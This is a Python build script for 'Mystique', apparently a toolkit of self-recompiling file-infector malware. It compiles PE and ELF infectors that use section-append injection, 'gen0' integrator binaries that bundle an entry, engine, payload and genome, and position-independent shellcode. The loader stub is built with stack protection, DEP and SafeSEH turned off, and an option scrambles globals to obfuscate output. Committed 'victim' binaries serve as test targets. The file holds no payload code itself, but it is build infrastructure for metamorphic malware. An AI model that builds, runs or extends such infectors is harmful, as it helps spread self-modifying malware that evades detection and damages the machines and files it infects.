#!/usr/bin/env python3
"""
Mystique build system -- clean and build on Windows and Linux.

Usage:
    python build.py clean       Remove all generated artifacts
    python build.py build       Detect platform, compile everything
    python build.py all         clean + build

Testing is handled by pytest. See docs/TESTING.md for details.
"""

import argparse
import os
import shutil
import subprocess
import sys

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

ROOT = os.path.dirname(os.path.abspath(__file__))

COMPILER_DIR   = os.path.join(ROOT, "compiler")
BACKEND_DIR    = os.path.join(COMPILER_DIR, "backend")
BUNDLES_DIR    = os.path.join(ROOT, "bundles")
LOADERS_DIR     = os.path.join(COMPILER_DIR, "loaders")
RECOMPILERS_DIR = os.path.join(BUNDLES_DIR, "recompilers")
INTEGRATORS_DIR = os.path.join(BUNDLES_DIR, "integrators")
INFECTORS_DIR   = os.path.join(BUNDLES_DIR, "infectors")
MFALL_DIR       = os.path.join(INTEGRATORS_DIR, "mystiqueFall")
LACRI_DIR       = os.path.join(INTEGRATORS_DIR, "lacriMystique")
TESTS_DIR       = os.path.join(ROOT, "tests")

IS_WINDOWS = sys.platform == "win32"

BACKEND_SRC    = os.path.join(BACKEND_DIR, "backend_mystc.c")
BACKEND_EXE    = os.path.join(BACKEND_DIR, "backend_mystc.exe" if IS_WINDOWS else "backend_mystc")
BACKEND_MC     = os.path.join(BACKEND_DIR, "backend_mystc.mc")
BACKEND_MCB    = os.path.join(BACKEND_DIR, "backend_mystc.mcb")
BACKEND_BIN    = os.path.join(BACKEND_DIR, "backend_mystc.bin")

# backend_main.mc wraps backend_mystc.mc with a main() for CLI usage
BACKEND_MAIN_MC  = os.path.join(BACKEND_DIR, "backend_main.mc")
BACKEND_MAIN_MCB = os.path.join(BACKEND_DIR, "backend_main.mcb")
BACKEND_MAIN_BIN = os.path.join(BACKEND_DIR, "backend_main.bin")

LOADER_SRC     = os.path.join(LOADERS_DIR, "loader_win32.c" if IS_WINDOWS else "loader_linux.c")
LOADER_EXE     = os.path.join(LOADERS_DIR, "loader_win32.exe" if IS_WINDOWS else "loader_linux")

MFALL_MC       = os.path.join(MFALL_DIR, "mystiquefall.mc")
MFALL_MCB      = os.path.join(MFALL_DIR, "mystiquefall.mcb")

LACRI_MC       = os.path.join(LACRI_DIR, "lacrimystique.mc")
LACRI_MCB      = os.path.join(LACRI_DIR, "lacrimystique.mcb")

INFECTOR_PE_MC   = os.path.join(INFECTORS_DIR, "infector_pe.mc")
INFECTOR_PE_MCB  = os.path.join(INFECTORS_DIR, "infector_pe.mcb")
INFECTOR_ELF_MC  = os.path.join(INFECTORS_DIR, "infector_elf.mc")
INFECTOR_ELF_MCB = os.path.join(INFECTORS_DIR, "infector_elf.mcb")

RECOMP_PE_MC   = os.path.join(RECOMPILERS_DIR, "recomp_pe.mc")
RECOMP_PE_MCB  = os.path.join(RECOMPILERS_DIR, "recomp_pe.mcb")
RECOMP_ELF_MC  = os.path.join(RECOMPILERS_DIR, "recomp_elf.mc")
RECOMP_ELF_MCB = os.path.join(RECOMPILERS_DIR, "recomp_elf.mcb")

ENTRY_MC       = os.path.join(INTEGRATORS_DIR, "integrator_entry.mc")  # unified; built twice (WIN32 / LINUX)
ENTRY_PE_MCB   = os.path.join(MFALL_DIR, "integrator_entry_pe.mcb")
ENTRY_ELF_MCB  = os.path.join(LACRI_DIR, "integrator_entry_elf.mcb")

# ---------------------------------------------------------------------------
# Terminal colors
# ---------------------------------------------------------------------------

def _supports_color():
    if os.environ.get("NO_COLOR"):
        return False
    if IS_WINDOWS:
        os.system("")  # enable ANSI on Windows
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_COLOR = _supports_color()

def _c(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text

def green(t):  return _c("32", t)
def red(t):    return _c("31", t)
def cyan(t):   return _c("36", t)
def yellow(t): return _c("33", t)
def bold(t):   return _c("1", t)

def header(msg):
    print(f"\n{cyan('===')} {bold(msg)} {cyan('===')}")

def ok(msg):
    print(f"  {green('OK')}  {msg}")

def fail(msg):
    print(f"  {red('FAIL')}  {msg}")

def info(msg):
    print(f"  {yellow('...')}  {msg}")

# ---------------------------------------------------------------------------
# MSVC auto-detection (Windows only)
# ---------------------------------------------------------------------------

_msvc_cache = {}

def find_msvc():
    """Auto-detect MSVC tools and Windows SDK paths. Returns dict or None."""
    if _msvc_cache:
        return _msvc_cache

    vswhere = r"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
    if not os.path.exists(vswhere):
        return None

    # Find VS installation path
    r = subprocess.run(
        [vswhere, "-latest", "-products", "*",
         "-requires", "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
         "-property", "installationPath"],
        capture_output=True, text=True
    )
    vs_path = r.stdout.strip()
    if not vs_path or not os.path.isdir(vs_path):
        return None

    # Read MSVC version
    ver_file = os.path.join(vs_path, "VC", "Auxiliary", "Build",
                            "Microsoft.VCToolsVersion.default.txt")
    if not os.path.exists(ver_file):
        return None
    with open(ver_file) as f:
        msvc_ver = f.read().strip()

    msvc_root = os.path.join(vs_path, "VC", "Tools", "MSVC", msvc_ver)
    if not os.path.isdir(msvc_root):
        return None

    # Find Windows SDK
    sdk_root = r"C:\Program Files (x86)\Windows Kits\10"
    sdk_inc = os.path.join(sdk_root, "Include")
    if not os.path.isdir(sdk_inc):
        return None

    # Pick latest SDK version
    sdk_versions = [d for d in os.listdir(sdk_inc)
                    if os.path.isdir(os.path.join(sdk_inc, d)) and d.startswith("10.")]
    if not sdk_versions:
        return None
    sdk_ver = sorted(sdk_versions)[-1]

    cl_exe = os.path.join(msvc_root, "bin", "Hostx64", "x86", "cl.exe")
    if not os.path.exists(cl_exe):
        return None

    result = {
        "cl": cl_exe,
        "msvc_root": msvc_root,
        "sdk_root": sdk_root,
        "sdk_ver": sdk_ver,
        "env": {
            "PATH": os.path.join(msvc_root, "bin", "Hostx64", "x86") + ";" + os.environ.get("PATH", ""),
            "INCLUDE": ";".join([
                os.path.join(msvc_root, "include"),
                os.path.join(sdk_root, "Include", sdk_ver, "ucrt"),
                os.path.join(sdk_root, "Include", sdk_ver, "um"),
                os.path.join(sdk_root, "Include", sdk_ver, "shared"),
            ]),
            "LIB": ";".join([
                os.path.join(msvc_root, "lib", "x86"),
                os.path.join(sdk_root, "Lib", sdk_ver, "ucrt", "x86"),
                os.path.join(sdk_root, "Lib", sdk_ver, "um", "x86"),
            ]),
        },
    }
    _msvc_cache.update(result)
    return result


def msvc_env():
    """Return os.environ merged with MSVC paths."""
    msvc = find_msvc()
    if not msvc:
        raise RuntimeError("MSVC not found -- install Visual Studio Build Tools "
                           "with C++ x86/x64 components")
    env = dict(os.environ)
    env.update(msvc["env"])
    return env

# ---------------------------------------------------------------------------
# Run helper
# ---------------------------------------------------------------------------

def run(cmd, cwd=None, env=None, check=True, quiet=False):
    """Run a command, return CompletedProcess."""
    if not quiet:
        info(" ".join(str(c) for c in cmd))
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd or ROOT, env=env)
    if check and r.returncode != 0:
        print(r.stdout)
        print(r.stderr, file=sys.stderr)
        raise RuntimeError(f"Command failed (exit {r.returncode}): {' '.join(str(c) for c in cmd)}")
    return r

# ---------------------------------------------------------------------------
# Clean
# ---------------------------------------------------------------------------

CLEAN_EXTENSIONS = {".obj", ".exe", ".bin", ".mcb", ".mct", ".mce", ".log"}
# No-extension Linux ELF outputs produced by build.py (these wouldn't be
# matched by CLEAN_EXTENSIONS).
CLEAN_NAMED_FILES = {
    "backend_mystc",        # Linux native backend
    "backend_mystc_sref",   # Linux self-recompiling ELF (--standalone)
    "mystiquefall_gen0",    # Linux gen0 PE/ELF integrator (--standalone)
    "lacrimystique_gen0",   # Linux gen0 ELF integrator (--standalone)
}
CLEAN_DIRS = ["__pycache__", ".pytest_cache"]
# Stale per-run scratch dirs that lived under tests/ in older layouts. Kept
# here for backwards compat; new tests use pytest tmp_path.
CLEAN_TEST_DIRS = ["win_tmp", "linux_tmp", "stress_bins", "gen_bins", "gen10",
                   "payload_win32_tmp", "payload_linux_tmp"]

# Roots whose subtrees we sweep for build artifacts (.mcb, .bin, .exe, ELF
# binaries, __pycache__).
WALK_ROOTS = [COMPILER_DIR, BUNDLES_DIR,
              os.path.join(ROOT, "ide"),
              os.path.join(ROOT, "utils"),
              TESTS_DIR]

# Subtrees that contain committed fixtures matching CLEAN_EXTENSIONS — we
# must NOT walk into these.
SKIP_SUBPATHS = {
    os.path.join(TESTS_DIR, "victims"),  # committed PE/ELF victim binaries
}

# Files that should never be cleaned (source-adjacent, committed)
KEEP_FILES = {"genome.json"}


def _should_clean(name: str) -> bool:
    if name in KEEP_FILES:
        return False
    if name in CLEAN_NAMED_FILES:
        return True
    return os.path.splitext(name)[1].lower() in CLEAN_EXTENSIONS


def cmd_clean(args):
    header("Clean")
    removed = 0

    # Sweep every build-output-producing root.
    for root in WALK_ROOTS:
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            # Don't descend into committed-fixture subtrees.
            if any(os.path.commonpath([dirpath, skip]) == skip
                   for skip in SKIP_SUBPATHS):
                dirnames[:] = []
                continue

            for f in filenames:
                if _should_clean(f):
                    os.remove(os.path.join(dirpath, f))
                    removed += 1

            for d in list(dirnames):
                if d in CLEAN_DIRS:
                    shutil.rmtree(os.path.join(dirpath, d), ignore_errors=True)
                    dirnames.remove(d)
                    removed += 1

    # Clean root __pycache__ (not under any walk root above).
    for d in CLEAN_DIRS:
        p = os.path.join(ROOT, d)
        if os.path.isdir(p):
            shutil.rmtree(p, ignore_errors=True)
            removed += 1

    # Drop legacy per-run scratch dirs left under tests/.
    for d in CLEAN_TEST_DIRS:
        p = os.path.join(TESTS_DIR, d)
        if os.path.isdir(p):
            shutil.rmtree(p, ignore_errors=True)
            removed += 1
        for parent in ("win_tmp", "linux_tmp"):
            p2 = os.path.join(TESTS_DIR, parent, d)
            if os.path.isdir(p2):
                shutil.rmtree(p2, ignore_errors=True)
                removed += 1

    ok(f"Removed {removed} artifact(s)")

# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def _remove_if_exists(path):
    """Remove a file if it exists (avoids MSVC linker lock errors)."""
    try:
        if os.path.exists(path):
            os.remove(path)
    except OSError:
        pass


def build_backend_native():
    """Compile backend_mystc.c -> backend_mystc.exe (or backend_mystc on Linux)."""
    header("Build backend (native)")
    _remove_if_exists(BACKEND_EXE)
    if IS_WINDOWS:
        msvc = find_msvc()
        if not msvc:
            raise RuntimeError("MSVC not found")
        info(f"MSVC {os.path.basename(os.path.dirname(os.path.dirname(msvc['cl'])))}")
        run([msvc["cl"], "/nologo", "/W3", "/O2", "/D_CRT_SECURE_NO_WARNINGS",
             BACKEND_SRC, f"/Fe:{BACKEND_EXE}"],
            cwd=BACKEND_DIR, env=msvc_env())
    else:
        run(["gcc", "-O2", "-o", BACKEND_EXE, BACKEND_SRC, "-lm"],
            cwd=BACKEND_DIR)
    size = os.path.getsize(BACKEND_EXE)
    ok(f"{os.path.basename(BACKEND_EXE)} ({size:,} bytes)")


def build_loader():
    """Compile loader stub."""
    header("Build loader")
    _remove_if_exists(LOADER_EXE)
    # Also remove .obj that MSVC drops next to .c
    _remove_if_exists(os.path.splitext(LOADER_SRC)[0] + ".obj")
    if IS_WINDOWS:
        msvc = find_msvc()
        run([msvc["cl"], "/nologo", "/W3", "/O1", "/GS-", "/Oi-",
             LOADER_SRC, f"/Fe:{LOADER_EXE}",
             "/link", "/NODEFAULTLIB", "/ENTRY:mainCRTStartup",
             "/SUBSYSTEM:CONSOLE", "/SAFESEH:NO", "/DYNAMICBASE:NO",
             "/NXCOMPAT:NO", "kernel32.lib"],
            cwd=LOADERS_DIR, env=msvc_env())
    else:
        run(["gcc", "-m32", "-O1", "-fno-stack-protector",
             "-o", LOADER_EXE, LOADER_SRC, "-ldl"],
            cwd=LOADERS_DIR)
    size = os.path.getsize(LOADER_EXE)
    ok(f"{os.path.basename(LOADER_EXE)} ({size:,} bytes)")


def frontend_compile(mc_path, mcb_path, defines=None, strip_debug=False, scramble_globals=False):
    """Compile a .mc file to .mcb using the Python frontend."""
    cmd = [sys.executable, "-m", "compiler.frontend.mystcc",
           mc_path, "-o", mcb_path]
    if defines:
        for d in defines:
            cmd.append(f"-D{d}")
    if strip_debug:
        cmd.append("--strip-debug")
    if scramble_globals:
        cmd.append("--scramble-globals")
    run(cmd)
    size = os.path.getsize(mcb_path)
    ok(f"{os.path.basename(mcb_path)} ({size:,} bytes)")


def build_mcbs(strip_debug=False, scramble_globals=False):
    """Compile all .mc source files to .mcb bytecode."""
    flags = []
    if strip_debug:        flags.append("--strip-debug")
    if scramble_globals:   flags.append("--scramble-globals")
    header("Compile MystC sources (.mc -> .mcb)" + (f" [{' '.join(flags)}]" if flags else ""))
    platform = ["WIN32"] if IS_WINDOWS else ["LINUX"]
    # backend_main.mc #includes backend_mystc.mc and provides main()
    frontend_compile(BACKEND_MAIN_MC, BACKEND_MCB, defines=platform, strip_debug=strip_debug, scramble_globals=scramble_globals)
    frontend_compile(MFALL_MC, MFALL_MCB, defines=["WIN32"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    frontend_compile(LACRI_MC, LACRI_MCB, defines=["LINUX"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    # Self-recompiling PE/ELF
    frontend_compile(RECOMP_PE_MC, RECOMP_PE_MCB, defines=["WIN32"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    frontend_compile(RECOMP_ELF_MC, RECOMP_ELF_MCB, defines=["LINUX"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    # Entry program (bundle architecture; one source, two targets)
    frontend_compile(ENTRY_MC, ENTRY_PE_MCB, defines=["WIN32"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    frontend_compile(ENTRY_MC, ENTRY_ELF_MCB, defines=["LINUX"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    # Simple infectors (alternative demo: section-append injection)
    frontend_compile(INFECTOR_PE_MC, INFECTOR_PE_MCB, defines=["WIN32", "ABS_MODE"], strip_debug=strip_debug, scramble_globals=scramble_globals)
    frontend_compile(INFECTOR_ELF_MC, INFECTOR_ELF_MCB, defines=["LINUX"], strip_debug=strip_debug, scramble_globals=scramble_globals)


def build_backend_bin():
    """Compile backend .mcb -> .bin shellcode using the native backend."""
    header("Compile backend shellcode (.mcb -> .bin)")
    run([BACKEND_EXE, BACKEND_MCB, "--pic", BACKEND_BIN])
    size = os.path.getsize(BACKEND_BIN)
    ok(f"{os.path.basename(BACKEND_BIN)} ({size:,} bytes)")


STANDALONE_PE  = os.path.join(BACKEND_DIR, "backend_mystc_srpe.exe" if IS_WINDOWS else "backend_mystc_srpe")
STANDALONE_ELF = os.path.join(BACKEND_DIR, "backend_mystc_sref")

# Gen0 infector binaries (bundle architecture: entry + engine 4-blob layout)
INFECTOR_PE  = os.path.join(MFALL_DIR, "mystiquefall_gen0.exe" if IS_WINDOWS else "mystiquefall_gen0")
INFECTOR_ELF = os.path.join(LACRI_DIR, "lacrimystique_gen0")


def build_standalone():
    """Build self-recompiling standalone PE and ELF from program .mcb files."""
    header("Build standalone self-recompiling binaries")
    if IS_WINDOWS:
        run([BACKEND_EXE,
             "--recompiler-pe", STANDALONE_PE,
             "--bundles-dir", BUNDLES_DIR,
             "--seed", "1"])
        size = os.path.getsize(STANDALONE_PE)
        ok(f"{os.path.basename(STANDALONE_PE)} ({size:,} bytes)")
    run([BACKEND_EXE,
         "--recompiler-elf", STANDALONE_ELF,
         "--bundles-dir", BUNDLES_DIR,
         "--seed", "1"])
    size = os.path.getsize(STANDALONE_ELF)
    ok(f"{os.path.basename(STANDALONE_ELF)} ({size:,} bytes)")

    # Gen0 integrator binaries (bundle: 4-blob [entry | engine | payload | genome])
    header("Build gen0 integrator binaries (bundle)")
    if IS_WINDOWS:
        run([BACKEND_EXE,
             "--integrator-pe", INFECTOR_PE,
             "--bundles-dir", BUNDLES_DIR,
             "--seed", "1"])
        size = os.path.getsize(INFECTOR_PE)
        ok(f"{os.path.basename(INFECTOR_PE)} ({size:,} bytes)")
    run([BACKEND_EXE,
         "--integrator-elf", INFECTOR_ELF,
         "--bundles-dir", BUNDLES_DIR,
         "--seed", "1"])
    size = os.path.getsize(INFECTOR_ELF)
    ok(f"{os.path.basename(INFECTOR_ELF)} ({size:,} bytes)")


def cmd_build(args):
    build_backend_native()
    build_loader()
    build_mcbs(
        strip_debug=getattr(args, 'strip_debug', False),
        scramble_globals=getattr(args, 'scramble_globals', False),
    )
    build_backend_bin()
    if getattr(args, 'standalone', False):
        build_standalone()
    header("Build complete")

def cmd_all(args):
    cmd_clean(args)
    cmd_build(args)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Mystique build system",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="command")

    sub.add_parser("clean", help="Remove all generated artifacts")
    p_build = sub.add_parser("build", help="Compile all binaries and bytecode")
    p_build.add_argument("--standalone", action="store_true",
                         help="Also build self-recompiling standalone PE/ELF")
    p_build.add_argument("--strip-debug", action="store_true",
                         help="Pass --strip-debug to every frontend compile (drops print/print_int/... calls)")
    p_build.add_argument("--scramble-globals", action="store_true",
                         help="Pass --scramble-globals to every frontend compile (demotes integer-literal global "
                              "initializers into a generated __init_globals + scrambles .data init values)")
    p_all = sub.add_parser("all", help="Clean + build")
    p_all.add_argument("--standalone", action="store_true")
    p_all.add_argument("--strip-debug", action="store_true")
    p_all.add_argument("--scramble-globals", action="store_true")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    try:
        if args.command == "clean":
            cmd_clean(args)
        elif args.command == "build":
            cmd_build(args)
        elif args.command == "all":
            cmd_all(args)
    except RuntimeError as e:
        print(f"\n{red('ERROR')}: {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{yellow('Interrupted')}")
        sys.exit(130)


if __name__ == "__main__":
    main()
